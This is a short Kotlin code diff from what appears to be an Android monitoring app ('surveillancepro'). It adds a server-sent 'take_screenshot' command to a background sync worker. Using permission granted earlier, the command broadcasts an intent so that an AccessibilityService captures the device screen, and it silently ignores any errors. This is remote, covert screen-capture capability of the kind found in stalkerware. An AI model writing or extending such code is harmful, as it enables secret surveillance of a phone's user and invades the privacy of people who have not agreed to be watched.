@@ -123,6 +123,18 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
                     val config = payload as? Map<String, Any> ?: emptyMap()
                     AppBlockerService.configureFromServer(config)
                 }
+                "take_screenshot" -> {
+                    // Capture d'écran à distance - nécessite MediaProjection déjà autorisé
+                    // La capture sera déclenchée via l'AccessibilityService
+                    try {
+                        val prefs = applicationContext.getSharedPreferences("sp_screen_capture", android.content.Context.MODE_PRIVATE)
+                        if (prefs.getBoolean("permission_granted", false)) {
+                            // Envoyer un broadcast pour déclencher la capture
+                            val intent = android.content.Intent("com.surveillancepro.TAKE_SCREENSHOT")
+                            applicationContext.sendBroadcast(intent)
+                        }
+                    } catch (_: Exception) {}
+                }
             }
 
             // Acquitter la commande
